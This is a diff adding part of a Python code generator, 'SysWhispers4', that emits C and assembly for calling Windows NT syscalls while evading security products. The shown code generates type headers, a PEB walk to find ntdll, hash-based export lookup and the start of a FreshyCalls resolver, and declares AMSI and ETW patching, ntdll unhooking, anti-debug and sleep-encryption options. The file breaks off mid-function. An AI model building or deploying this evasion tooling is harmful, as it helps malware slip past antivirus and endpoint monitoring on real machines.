@@ -1,0 +1,2340 @@
+"""
+SysWhispers4 - Code Generator
+Generates C headers, C runtime source, and ASM stubs for NT syscalls.
+
+Techniques:
+  SSN Resolution : Static | FreshyCalls | Hell's Gate | Halo's Gate |
+                   Tartarus' Gate | SyscallsFromDisk | RecycledGate | HW Breakpoint
+  Invocation     : Embedded (direct) | Indirect | Randomized Indirect | Egg Hunt
+  Evasion        : XOR SSN encryption | Call stack spoofing | ETW bypass |
+                   AMSI bypass | ntdll unhooking | Anti-debug | Sleep encryption
+"""
+from __future__ import annotations
+
+import os
+import random
+import textwrap
+from pathlib import Path
+from typing import Dict, List, Optional, Tuple
+
+from .models import (
+    Architecture, Compiler, GeneratorConfig,
+    InvocationMethod, ResolutionMethod, SyscallParam, SyscallPrototype,
+)
+from .obfuscator import Obfuscator
+from .utils import djb2_hash, load_prototypes, load_ssn_table_x64, load_ssn_table_x86
+
+
+# ---------------------------------------------------------------------------
+# Top-level entry point
+# ---------------------------------------------------------------------------
+
+class SysWhispers4:
+    """Main code generation engine for SysWhispers4."""
+
+    def __init__(self, config: GeneratorConfig):
+        self.cfg = config
+        self.obf = Obfuscator(seed=random.randint(0, 0xFFFFFFFF))
+        self._prototypes: List[SyscallPrototype] = []
+        self._ssn_x64: dict = {}
+        self._ssn_x86: dict = {}
+
+    # -----------------------------------------------------------------------
+    # Public API
+    # -----------------------------------------------------------------------
+
+    def generate(self) -> Dict[str, str]:
+        """
+        Generate all output files.
+        Returns: {filename: content} mapping.
+        """
+        self._load_data()
+        cfg = self.cfg
+
+        outputs: Dict[str, str] = {}
+
+        # 1. Types header (SW4Syscalls_Types.h)
+        types_fname = f"{cfg.out_file}_Types.h"
+        outputs[types_fname] = self._gen_types_header()
+
+        # 2. Syscalls header (SW4Syscalls.h)
+        hdr_fname = f"{cfg.out_file}.h"
+        outputs[hdr_fname] = self._gen_syscalls_header(types_fname)
+
+        # 3. C source (SW4Syscalls.c)
+        c_fname = f"{cfg.out_file}.c"
+        outputs[c_fname] = self._gen_syscalls_c(hdr_fname)
+
+        # 4. ASM or inline-asm C
+        if cfg.compiler == Compiler.MSVC:
+            if cfg.arch == Architecture.x86:
+                asm_fname = f"{cfg.out_file}.x86.asm"
+            else:
+                asm_fname = f"{cfg.out_file}.asm"
+            outputs[asm_fname] = self._gen_asm_msvc()
+        else:
+            # MinGW / Clang: inline asm in a separate C file
+            asm_fname = f"{cfg.out_file}_stubs.c"
+            outputs[asm_fname] = self._gen_asm_gas_inline()
+
+        return outputs
+
+    def write_outputs(self, outputs: Dict[str, str]) -> None:
+        """Write generated files to the configured output directory."""
+        out_dir = Path(self.cfg.out_dir)
+        out_dir.mkdir(parents=True, exist_ok=True)
+        for fname, content in outputs.items():
+            fpath = out_dir / fname
+            fpath.write_text(content, encoding="utf-8")
+            print(f"  [+] Generated {fpath}")
+
+    # -----------------------------------------------------------------------
+    # Data loading
+    # -----------------------------------------------------------------------
+
+    def _load_data(self) -> None:
+        raw_proto = load_prototypes()
+        self._ssn_x64 = load_ssn_table_x64()
+        self._ssn_x86 = load_ssn_table_x86()
+
+        # Override SSN table if user provided one
+        if self.cfg.syscall_table and Path(self.cfg.syscall_table).exists():
+            from .utils import load_json
+            self._ssn_x64 = load_json(self.cfg.syscall_table)
+
+        for fname in self.cfg.functions:
+            if fname not in raw_proto:
+                print(f"  [!] Warning: '{fname}' not found in prototypes.json, skipping.")
+                continue
+            entry = raw_proto[fname]
+            params = [
+                SyscallParam(
+                    name=p["name"],
+                    type=p["type"],
+                    annotation=p.get("annotation", ""),
+                )
+                for p in entry.get("params", [])
+            ]
+            self._prototypes.append(
+                SyscallPrototype(
+                    name=fname,
+                    return_type=entry.get("return_type", "NTSTATUS"),
+                    params=params,
+                )
+            )
+
+        if self.cfg.obfuscate:
+            self._prototypes = [
+                self._prototypes[i]
+                for i in self.obf.shuffle_functions(
+                    list(range(len(self._prototypes)))
+                )
+            ]
+
+    # -----------------------------------------------------------------------
+    # XOR encryption helpers
+    # -----------------------------------------------------------------------
+
+    def _xor_key(self) -> int:
+        if not hasattr(self, "_cached_xor_key"):
+            self._cached_xor_key = self.obf.generate_xor_key() if self.cfg.encrypt_ssn else 0
+        return self._cached_xor_key
+
+    def _ssn_value(self, ssn: int) -> int:
+        return ssn ^ self._xor_key() if self.cfg.encrypt_ssn else ssn
+
+    def _ssn_c_value(self, ssn: int) -> str:
+        v = self._ssn_value(ssn)
+        return f"0x{v:04X}U"
+
+    # -----------------------------------------------------------------------
+    # Static SSN table helpers
+    # -----------------------------------------------------------------------
+
+    def _get_static_ssns(self) -> List[Optional[int]]:
+        """For static resolution: list of SSNs per function (None if unknown)."""
+        tbl = self._ssn_x64 if self.cfg.arch != Architecture.x86 else self._ssn_x86
+        result = []
+        for proto in self._prototypes:
+            entry = tbl.get(proto.name)
+            if entry:
+                numeric = {int(k): v for k, v in entry.items() if k.isdigit()}
+                # Use highest available build
+                ssn = numeric[max(numeric)] if numeric else None
+            else:
+                ssn = None
+            result.append(ssn)
+        return result
+
+    def _static_ssn_table_c(self) -> str:
+        """Generate static SSN lookup table for all supported builds."""
+        p = self.cfg.prefix
+        tbl = self._ssn_x64 if self.cfg.arch != Architecture.x86 else self._ssn_x86
+
+        lines = [f"/* Build-indexed SSN table for static resolution */"]
+        lines.append(f"static const {p}SSN_ENTRY {p}StaticSsnTable[{p}FUNC_COUNT] = {{")
+
+        for proto in self._prototypes:
+            entry = tbl.get(proto.name, {})
+            numeric = {int(k): v for k, v in entry.items() if k.isdigit()}
+            if numeric:
+                pairs = ", ".join(
+                    f"{{ {build}U, {self._ssn_c_value(ssn)} }}"
+                    for build, ssn in sorted(numeric.items())
+                )
+                lines.append(f"    /* {proto.name} */")
+                lines.append(f"    {{ {len(numeric)}, {{ {pairs} }} }},")
+            else:
+                lines.append(f"    /* {proto.name} - NOT IN TABLE */")
+                lines.append(f"    {{ 0, {{ }} }},")
+
+        lines.append("};")
+        return "\n".join(lines)
+
+    # -----------------------------------------------------------------------
+    # 1. Types Header Generation
+    # -----------------------------------------------------------------------
+
+    def _gen_types_header(self) -> str:
+        p = self.cfg.prefix
+        guard = f"{p}SYSCALLS_TYPES_H"
+        return f"""\
+/*
+ * {self.cfg.out_file}_Types.h -- generated by SysWhispers4
+ * DO NOT EDIT -- regenerate with syswhispers.py
+ *
+ * Resolution : {self.cfg.resolve}
+ * Method     : {self.cfg.method}
+ * Arch       : {self.cfg.arch}
+ * Compiler   : {self.cfg.compiler}
+ */
+#pragma once
+#ifndef {guard}
+#define {guard}
+
+#include <windows.h>
+#include <winternl.h>
+
+/* =========================================================================
+ *  SW4 -- NT type definitions not in winternl.h / ntdef.h
+ * ========================================================================= */
+
+#ifndef NT_SUCCESS
+# define NT_SUCCESS(Status)  (((NTSTATUS)(Status)) >= 0)
+#endif
+
+#ifndef STATUS_SUCCESS
+# define STATUS_SUCCESS      ((NTSTATUS)0x00000000L)
+#endif
+
+#ifndef STATUS_ACCESS_DENIED
+# define STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)
+#endif
+
+#ifndef STATUS_INFO_LENGTH_MISMATCH
+# define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
+#endif
+
+/* ---------- Process/Thread information classes --------------------------- */
+#ifndef _PROCESSINFOCLASS
+typedef enum _PROCESSINFOCLASS {{
+    ProcessBasicInformation           = 0,
+    ProcessDebugPort                  = 7,
+    ProcessWow64Information           = 26,
+    ProcessImageFileName              = 27,
+    ProcessBreakOnTermination         = 29,
+    ProcessSubsystemInformation       = 75,
+    ProcessInstrumentationCallback    = 40,
+}} PROCESSINFOCLASS;
+#endif
+
+#ifndef _THREADINFOCLASS
+typedef enum _THREADINFOCLASS {{
+    ThreadBasicInformation            = 0,
+    ThreadTimes                       = 1,
+    ThreadPriority                    = 2,
+    ThreadBasePriority                = 3,
+    ThreadAffinityMask                = 4,
+    ThreadImpersonationToken          = 5,
+    ThreadDescriptorTableEntry        = 6,
+    ThreadEnableAlignmentFaultFixup   = 7,
+    ThreadEventPair                   = 8,
+    ThreadQuerySetWin32StartAddress   = 9,
+    ThreadZeroTlsCell                 = 10,
+    ThreadPerformanceCount            = 11,
+    ThreadAmILastThread               = 12,
+    ThreadIdealProcessor              = 13,
+    ThreadPriorityBoost               = 14,
+    ThreadSetTlsArrayAddress          = 15,
+    ThreadIsIoPending                 = 16,
+    ThreadHideFromDebugger            = 17,
+}} THREADINFOCLASS;
+#endif
+
+/* ---------- Memory information class ------------------------------------- */
+#ifndef _MEMORY_INFORMATION_CLASS
+typedef enum _MEMORY_INFORMATION_CLASS {{
+    MemoryBasicInformation            = 0,
+    MemoryWorkingSetInformation       = 1,
+    MemoryMappedFilenameInformation   = 2,
+    MemoryRegionInformation           = 3,
+    MemoryWorkingSetExInformation     = 4,
+    MemorySharedCommitInformation     = 5,
+    MemoryImageInformation            = 6,
+}} MEMORY_INFORMATION_CLASS;
+#endif
+
+/* ---------- System information class ------------------------------------- */
+#ifndef _SYSTEM_INFORMATION_CLASS
+typedef enum _SYSTEM_INFORMATION_CLASS {{
+    SystemBasicInformation            = 0,
+    SystemProcessInformation          = 5,
+    SystemModuleInformation           = 11,
+    SystemHandleInformation           = 16,
+    SystemKernelDebuggerInformation   = 35,
+    SystemCodeIntegrityInformation    = 103,
+    SystemExtendedHandleInformation   = 64,
+}} SYSTEM_INFORMATION_CLASS;
+#endif
+
+/* ---------- Object information class ------------------------------------- */
+#ifndef _OBJECT_INFORMATION_CLASS
+typedef enum _OBJECT_INFORMATION_CLASS {{
+    ObjectBasicInformation            = 0,
+    ObjectNameInformation             = 1,
+    ObjectTypeInformation             = 2,
+}} OBJECT_INFORMATION_CLASS;
+#endif
+
+/* ---------- Token types -------------------------------------------------- */
+#ifndef _TOKEN_INFORMATION_CLASS
+typedef enum _TOKEN_INFORMATION_CLASS {{
+    TokenUser                         = 1,
+    TokenGroups                       = 2,
+    TokenPrivileges                   = 3,
+    TokenOwner                        = 4,
+    TokenPrimaryGroup                 = 5,
+    TokenDefaultDacl                  = 6,
+    TokenSource                       = 7,
+    TokenType                         = 8,
+    TokenImpersonationLevel           = 9,
+    TokenStatistics                   = 10,
+    TokenRestrictedSids               = 11,
+    TokenSessionId                    = 12,
+    TokenGroupsAndPrivileges          = 13,
+    TokenSandBoxInert                 = 15,
+    TokenOrigin                       = 17,
+    TokenElevationType                = 18,
+    TokenLinkedToken                  = 19,
+    TokenElevation                    = 20,
+    TokenHasRestrictions              = 21,
+    TokenAccessInformation            = 22,
+    TokenVirtualizationAllowed        = 23,
+    TokenVirtualizationEnabled        = 24,
+    TokenIntegrityLevel               = 25,
+    TokenUIAccess                     = 26,
+    TokenMandatoryPolicy              = 27,
+    TokenLogonSid                     = 28,
+    TokenIsAppContainer               = 29,
+}} TOKEN_INFORMATION_CLASS;
+#endif
+
+#ifndef _TOKEN_TYPE
+typedef enum _TOKEN_TYPE {{
+    TokenPrimary       = 1,
+    TokenImpersonation = 2,
+}} TOKEN_TYPE;
+#endif
+
+/* ---------- Section / MapView types --------------------------------------- */
+#ifndef _SECTION_INHERIT
+typedef enum _SECTION_INHERIT {{
+    ViewShare = 1,
+    ViewUnmap = 2,
+}} SECTION_INHERIT;
+#endif
+
+#ifndef _WAIT_TYPE
+typedef enum _WAIT_TYPE {{
+    WaitAll  = 0,
+    WaitAny  = 1,
+}} WAIT_TYPE;
+#endif
+
+/* ---------- PS attributes / create info ---------------------------------- */
+#ifndef _PS_ATTRIBUTE_LIST
+typedef struct _PS_ATTRIBUTE {{
+    ULONG_PTR Attribute;
+    SIZE_T    Size;
+    union {{
+        ULONG_PTR Value;
+        PVOID     ValuePtr;
+    }};
+    PSIZE_T   ReturnLength;
+}} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
+
+typedef struct _PS_ATTRIBUTE_LIST {{
+    SIZE_T       TotalLength;
+    PS_ATTRIBUTE Attributes[1];
+}} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
+#endif
+
+#ifndef _PS_CREATE_INFO
+typedef struct _PS_CREATE_INFO {{
+    SIZE_T  Size;
+    ULONG   State;
+    union {{
+        struct {{
+            ULONG  InitFlags;
+            ACCESS_MASK AdditionalFileAccess;
+        }} InitState;
+        struct {{
+            HANDLE FileHandle;
+        }} FailSection;
+        struct {{
+            USHORT DllCharacteristics;
+        }} ExeFormat;
+        struct {{
+            HANDLE IFEOKey;
+        }} ExeName;
+        struct {{
+            ULONG  OutputFlags;
+            ULONG  Flags;
+            HANDLE FileHandle;
+            HANDLE SectionHandle;
+            ULONGLONG UserProcessParametersNative;
+            ULONG  UserProcessParametersWow64;
+            ULONG  CurrentParameterFlags;
+            ULONGLONG PebAddressNative;
+            ULONG  PebAddressWow64;
+            ULONGLONG ManifestAddress;
+            ULONG  ManifestSize;
+        }} SuccessState;
+    }};
+}} PS_CREATE_INFO, *PPS_CREATE_INFO;
+#endif
+
+/* ---------- APC / Token types -------------------------------------------- */
+typedef VOID (NTAPI *PPS_APC_ROUTINE)(
+    PVOID ApcArgument1,
+    PVOID ApcArgument2,
+    PVOID ApcArgument3
+);
+
+typedef struct _TOKEN_PRIVILEGES {{
+    DWORD             PrivilegeCount;
+    LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];
+}} TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES;
+
+/* ---------- Client ID ------------------------------------------------------ */
+#ifndef _CLIENT_ID
+typedef struct _CLIENT_ID {{
+    PVOID UniqueProcess;
+    PVOID UniqueThread;
+}} CLIENT_ID, *PCLIENT_ID;
+#endif
+
+/* ---------- IO Status Block ----------------------------------------------- */
+#ifndef _IO_STATUS_BLOCK
+typedef struct _IO_STATUS_BLOCK {{
+    union {{
+        NTSTATUS Status;
+        PVOID    Pointer;
+    }};
+    ULONG_PTR Information;
+}} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
+#endif
+
+/* ---------- Security QoS -------------------------------------------------- */
+#ifndef _SECURITY_QUALITY_OF_SERVICE
+typedef struct _SECURITY_QUALITY_OF_SERVICE {{
+    DWORD                        Length;
+    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
+    BOOLEAN                      ContextTrackingMode;
+    BOOLEAN                      EffectiveOnly;
+}} SECURITY_QUALITY_OF_SERVICE, *PSECURITY_QUALITY_OF_SERVICE;
+#endif
+
+/* ---------- Timer types (for sleep encryption) ----------------------------- */
+#ifndef _TIMER_TYPE
+typedef enum _TIMER_TYPE {{
+    NotificationTimer = 0,
+    SynchronizationTimer = 1,
+}} TIMER_TYPE;
+#endif
+
+/* =========================================================================
+ *  SW4 Internal structures used by the runtime
+ * ========================================================================= */
+
+/* Entry in the static SSN lookup table */
+typedef struct _{p}SSN_ENTRY {{
+    DWORD  Count;
+    struct {{
+        DWORD Build;
+        DWORD Ssn;
+    }} Entries[64];
+}} {p}SSN_ENTRY;
+
+/* Export entry used during FreshyCalls / Hell's Gate scanning */
+typedef struct _{p}EXPORT {{
+    PVOID Address;
+    DWORD Hash;
+    DWORD Ordinal;
+}} {p}EXPORT, *P{p}EXPORT;
+
+#endif /* {guard} */
+"""
+
+    # -----------------------------------------------------------------------
+    # 2. Syscalls Header Generation
+    # -----------------------------------------------------------------------
+
+    def _gen_syscalls_header(self, types_header: str) -> str:
+        p = self.cfg.prefix
+        guard = f"{p}SYSCALLS_H"
+
+        protos = "\n".join(
+            f"EXTERN_C {proto.c_prototype(prefix=p)}"
+            for proto in self._prototypes
+        )
+
+        init_comment = {
+            ResolutionMethod.Static:          "static table -- no init required if using compile-time SSNs",
+            ResolutionMethod.FreshyCalls:     "FreshyCalls -- sorts ntdll Nt* exports by VA",
+            ResolutionMethod.HellsGate:       "Hell's Gate  -- reads SSN from ntdll stub opcode",
+            ResolutionMethod.HalosGate:       "Halo's Gate  -- Hell's Gate + neighbor scan for hooks",
+            ResolutionMethod.TartarusGate:    "Tartarus' Gate -- handles near/far JMP hooks",
+            ResolutionMethod.SyscallsFromDisk:"SyscallsFromDisk -- loads clean ntdll from KnownDlls",
+            ResolutionMethod.RecycledGate:    "RecycledGate -- FreshyCalls + opcode validation",
+            ResolutionMethod.HWBreakpoint:    "HW Breakpoint -- DR registers + VEH to extract SSN",
+        }[self.cfg.resolve]
+
+        egg_init = ""
+        if self.cfg.method == InvocationMethod.Egg:
+            egg_init = f"\nEXTERN_C BOOL {p}HatchEggs(VOID);  /* Patch egg markers -> syscall opcode */"
+
+        etw_init = ""
+        if self.cfg.etw_bypass:
+            etw_init = f"\nEXTERN_C BOOL {p}PatchEtw(VOID);   /* Optionally patch user-mode ETW writer */"
+
+        amsi_init = ""
+        if self.cfg.amsi_bypass:
+            amsi_init = f"\nEXTERN_C BOOL {p}PatchAmsi(VOID);  /* Patch AmsiScanBuffer */"
+
+        unhook_init = ""
+        if self.cfg.unhook_ntdll:
+            unhook_init = f"\nEXTERN_C BOOL {p}UnhookNtdll(VOID); /* Remap clean ntdll .text section */"
+
+        antidebug_init = ""
+        if self.cfg.anti_debug:
+            antidebug_init = f"\nEXTERN_C BOOL {p}AntiDebugCheck(VOID); /* Check for debugger presence */"
+
+        sleep_init = ""
+        if self.cfg.sleep_encrypt:
+            sleep_init = f"\nEXTERN_C VOID {p}SleepEncrypt(DWORD dwMilliseconds); /* Sleep with memory encryption */"
+
+        return f"""\
+/*
+ * {self.cfg.out_file}.h -- generated by SysWhispers4
+ * DO NOT EDIT -- regenerate with syswhispers.py
+ */
+#pragma once
+#ifndef {guard}
+#define {guard}
+
+#include "{types_header}"
+
+#ifdef __cplusplus
+extern "C" {{
+#endif
+
+/* =========================================================================
+ *  Runtime initialization
+ *  {init_comment}
+ * ========================================================================= */
+EXTERN_C BOOL {p}Initialize(VOID);
+{egg_init}{etw_init}{amsi_init}{unhook_init}{antidebug_init}{sleep_init}
+
+/* =========================================================================
+ *  Syscall function prototypes
+ * ========================================================================= */
+{protos}
+
+#ifdef __cplusplus
+}}
+#endif
+
+#endif /* {guard} */
+"""
+
+    # -----------------------------------------------------------------------
+    # 3. C Source Generation
+    # -----------------------------------------------------------------------
+
+    def _gen_syscalls_c(self, header_file: str) -> str:
+        p = self.cfg.prefix
+        n = len(self._prototypes)
+        func_names = [proto.name for proto in self._prototypes]
+        hashes = [djb2_hash(name) for name in func_names]
+
+        sections = [self._c_file_header(header_file)]
+        sections.append(self._c_constants(p, n, hashes, func_names))
+        sections.append(self._c_global_tables(p, n))
+        sections.append(self._c_hash_function(p))
+        sections.append(self._c_peb_ntdll(p))
+        sections.append(self._c_eat_scanner(p))
+
+        # Resolution methods
+        if self.cfg.resolve == ResolutionMethod.Static:
+            sections.append(self._c_static_resolution(p, n, func_names))
+        elif self.cfg.resolve == ResolutionMethod.FreshyCalls:
+            sections.append(self._c_freshycalls(p, n))
+        elif self.cfg.resolve == ResolutionMethod.HellsGate:
+            sections.append(self._c_hellsgate(p, n))
+        elif self.cfg.resolve == ResolutionMethod.HalosGate:
+            sections.append(self._c_halosgate(p, n))
+        elif self.cfg.resolve == ResolutionMethod.TartarusGate:
+            sections.append(self._c_tartarusgate(p, n))
+        elif self.cfg.resolve == ResolutionMethod.SyscallsFromDisk:
+            sections.append(self._c_syscalls_from_disk(p, n))
+        elif self.cfg.resolve == ResolutionMethod.RecycledGate:
+            sections.append(self._c_recycledgate(p, n))
+        elif self.cfg.resolve == ResolutionMethod.HWBreakpoint:
+            sections.append(self._c_hw_breakpoint(p, n))
+
+        if self.cfg.method in (InvocationMethod.Indirect, InvocationMethod.Randomized):
+            sections.append(self._c_gadget_finder(p, n))
+
+        if self.cfg.method == InvocationMethod.Egg:
+            sections.append(self._c_egg_hatcher(p))
+
+        if self.cfg.etw_bypass:
+            sections.append(self._c_etw_bypass(p))
+
+        if self.cfg.amsi_bypass:
+            sections.append(self._c_amsi_bypass(p))
+
+        if self.cfg.unhook_ntdll:
+            sections.append(self._c_unhook_ntdll(p))
+
+        if self.cfg.anti_debug:
+            sections.append(self._c_anti_debug(p))
+
+        if self.cfg.sleep_encrypt:
+            sections.append(self._c_sleep_encrypt(p))
+
+        sections.append(self._c_initialize(p))
+        return "\n\n".join(sections)
+
+    def _c_file_header(self, header: str) -> str:
+        return f"""\
+/*
+ * {self.cfg.out_file}.c -- generated by SysWhispers4
+ * DO NOT EDIT -- regenerate with syswhispers.py
+ *
+ * Resolution : {self.cfg.resolve}
+ * Method     : {self.cfg.method}
+ * Arch       : {self.cfg.arch}
+ */
+#include "{header}"
+#include <stddef.h>
+#include <string.h>"""
+
+    def _c_constants(self, p: str, n: int, hashes: list, func_names: list) -> str:
+        hash_entries = "\n    ".join(
+            f"0x{h:08X}U,  /* {name} */"
+            for h, name in zip(hashes, func_names)
+        )
+        xor_macro = ""
+        if self.cfg.encrypt_ssn:
+            key = self._xor_key()
+            xor_macro = (
+                f"\n/* XOR key for SSN decryption */\n"
+                f"#define {p}XOR_KEY 0x{key:08X}U\n"
+                f"#define {p}DECRYPT(v) ((DWORD)((v) ^ {p}XOR_KEY))\n"
+            )
+        else:
+            xor_macro = f"\n#define {p}DECRYPT(v) (v)\n"
+
+        gadget_pool_size = 64 if self.cfg.method == InvocationMethod.Randomized else 0
+
+        return f"""\
+/* =========================================================================
+ *  Constants
+ * ========================================================================= */
+#define {p}FUNC_COUNT    {n}U
+#define {p}MAX_EXPORTS   1024U
+#define {p}GADGET_POOL   {gadget_pool_size}U
+#define {p}GADGET_MASK   ({gadget_pool_size - 1}U)  /* pool must be power of 2 */
+{xor_macro}
+/* DJB2 hashes of function names (compile-time) */
+static const DWORD {p}FuncHashes[{p}FUNC_COUNT] = {{
+    {hash_entries}
+}};"""
+
+    def _c_global_tables(self, p: str, n: int) -> str:
+        addr_table = ""
+        if self.cfg.method in (InvocationMethod.Indirect, InvocationMethod.Randomized):
+            addr_table = f"\nPVOID {p}SyscallAddrTable[{p}FUNC_COUNT];  /* addr of syscall;ret in ntdll */"
+        gadget_pool = ""
+        if self.cfg.method == InvocationMethod.Randomized:
+            gadget_pool = (
+                f"\nPVOID  {p}GadgetPool[{p}GADGET_POOL];   /* random syscall;ret gadgets */\n"
+                f"DWORD  {p}GadgetPoolCount;                /* entries filled in pool */"
+            )
+        return f"""\
+/* =========================================================================
+ *  Runtime tables (populated by {p}Initialize)
+ * ========================================================================= */
+DWORD  {p}SsnTable[{p}FUNC_COUNT];          /* SSN for each function */{addr_table}{gadget_pool}"""
+
+    def _c_hash_function(self, p: str) -> str:
+        return f"""\
+/* =========================================================================
+ *  DJB2 hash (matches compile-time hashes above)
+ * ========================================================================= */
+static DWORD {p}HashStr(const char* s) {{
+    DWORD h = 0x1505U;
+    while (*s) {{ h = ((h << 5) + h) ^ (unsigned char)*s++; }}
+    return h;
+}}"""
+
+    def _c_peb_ntdll(self, p: str) -> str:
+        if self.cfg.arch == Architecture.x86:
+            peb_read = "PPEB pPeb = (PPEB)__readfsdword(0x30);"
+        else:
+            peb_read = "PPEB pPeb = (PPEB)__readgsqword(0x60);"
+
+        return f"""\
+/* =========================================================================
+ *  Locate ntdll.dll via PEB (no Win32 API calls)
+ * ========================================================================= */
+static PVOID {p}GetNtdllBase(VOID) {{
+    {peb_read}
+    PPEB_LDR_DATA   pLdr   = pPeb->Ldr;
+    PLIST_ENTRY     pHead  = &pLdr->InMemoryOrderModuleList;
+    PLIST_ENTRY     pEntry = pHead->Flink; /* exe */
+    pEntry = pEntry->Flink;               /* ntdll (always 2nd in InMemoryOrder) */
+    PLDR_DATA_TABLE_ENTRY pMod =
+        CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+    return pMod->DllBase;
+}}
+
+/* Get own image base via PEB */
+static PVOID {p}GetOwnImageBase(VOID) {{
+    {peb_read}
+    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
+    PLDR_DATA_TABLE_ENTRY pMod =
+        CONTAINING_RECORD(pHead->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+    return pMod->DllBase;
+}}"""
+
+    def _c_eat_scanner(self, p: str) -> str:
+        return f"""\
+/* =========================================================================
+ *  EAT utility: find export by hash
+ * ========================================================================= */
+static PVOID {p}GetProcByHash(PVOID pModule, DWORD dwHash) {{
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;
+    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)pModule + pDos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(
+        (PBYTE)pModule +
+        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    PDWORD pFnArr = (PDWORD)((PBYTE)pModule + pExp->AddressOfFunctions);
+    PDWORD pNmArr = (PDWORD)((PBYTE)pModule + pExp->AddressOfNames);
+    PWORD  pOrArr = (PWORD) ((PBYTE)pModule + pExp->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {{
+        const char* pName = (const char*)((PBYTE)pModule + pNmArr[i]);
+        if ({p}HashStr(pName) == dwHash)
+            return (PVOID)((PBYTE)pModule + pFnArr[pOrArr[i]]);
+    }}
+    return NULL;
+}}
+
+/* Find export by name string (for VEH-based methods) */
+static PVOID {p}GetProcByName(PVOID pModule, const char* szName) {{
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;
+    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)pModule + pDos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(
+        (PBYTE)pModule +
+        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    PDWORD pFnArr = (PDWORD)((PBYTE)pModule + pExp->AddressOfFunctions);
+    PDWORD pNmArr = (PDWORD)((PBYTE)pModule + pExp->AddressOfNames);
+    PWORD  pOrArr = (PWORD) ((PBYTE)pModule + pExp->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {{
+        const char* pName = (const char*)((PBYTE)pModule + pNmArr[i]);
+        DWORD j = 0;
+        while (pName[j] && szName[j] && pName[j] == szName[j]) j++;
+        if (pName[j] == 0 && szName[j] == 0)
+            return (PVOID)((PBYTE)pModule + pFnArr[pOrArr[i]]);
+    }}
+    return NULL;
+}}
+
+/* =========================================================================
+ *  Insertion-sort helper for export arrays (avoids qsort dependency)
+ * ========================================================================= */
+static VOID {p}SortExports(P{p}EXPORT arr, DWORD n) {{
+    for (DWORD i = 1; i < n; i++) {{
+        {p}EXPORT key = arr[i];
+        LONG j = (LONG)i - 1;
+        while (j >= 0 && arr[j].Address > key.Address) {{
+            arr[j + 1] = arr[j];
+            j--;
+        }}
+        arr[j + 1] = key;
+    }}
+}}
+
+/* =========================================================================
+ *  Parse PE section headers (used by multiple evasion techniques)
+ * ========================================================================= */
+static PIMAGE_SECTION_HEADER {p}FindSection(PVOID pModule, const char* name) {{
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;
+    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)pModule + pDos->e_lfanew);
+    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+
+    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {{
+        BOOL match = TRUE;
+        for (int j = 0; name[j]; j++) {{
+            if (pSec->Name[j] != (BYTE)name[j]) {{ match = FALSE; break; }}
+        }}
+        if (match) return pSec;
+    }}
+    return NULL;
+}}"""
+
+    # -----------------------------------------------------------------------
+    # Resolution method C implementations
+    # -----------------------------------------------------------------------
+
+    def _c_freshycalls(self, p: str, n: int) -> str:
+        addr_fill = ""
+        if self.cfg.method in (InvocationMethod.Indirect, InvocationMethod.Randomized):
+            addr_fill = f"""
+            /* Also record the syscall;ret gadget address for this stub */
+            PBYTE pStub = (PBYTE)exports[ei].Address;
+            for (DWORD k = 0; k < 32 && !{p}SyscallAddrTable[fi]; k++) {{
+                if (pStub[k] == 0x0Fu && pStub[k + 1u] == 0x05u)
+                    {p}SyscallAddrTable[fi] = pStub + k;
+            }}"""
+
+        return f"""\
+/* =========================================================================
+ *  FreshyCalls SSN resolution
+ *  Sorts all ntdll Nt* exports by VA -> sorted index == SSN
+ *  Resistant to hooks: does not read from potentially-hooked function bytes
+ * ========================================================================= */
+static BOOL {p}FreshyCalls(PVOID pNtdll) {{
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdll;
+    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)pNtdll + pDos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(
+        (PBYTE)pNtdll +
+        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    PDWORD pFnArr = (PDWORD)((PBYTE)pNtdll + pExp->AddressOfFunctions);
+    PDWORD pNmArr = (PDWORD)((PBYTE)pNtdll + pExp->AddressOfNames);
+    PWORD  pOrArr = (PWORD )((PBYTE)pNtdll + pExp->AddressOfNameOrdinals);
+
+    /* Collect all Nt* exports */
+    {p}EXPORT exports[{p}MAX_EXPORTS];
+    DWORD count = 0;
+
+    for (DWORD i = 0; i < pExp->NumberOfNames && count < {p}MAX_EXPORTS; i++) {{
+        const char* pName = (const char*)((PBYTE)pNtdll + pNmArr[i]);
+        if (pName[0] == 'N' && pName[1] == 't') {{
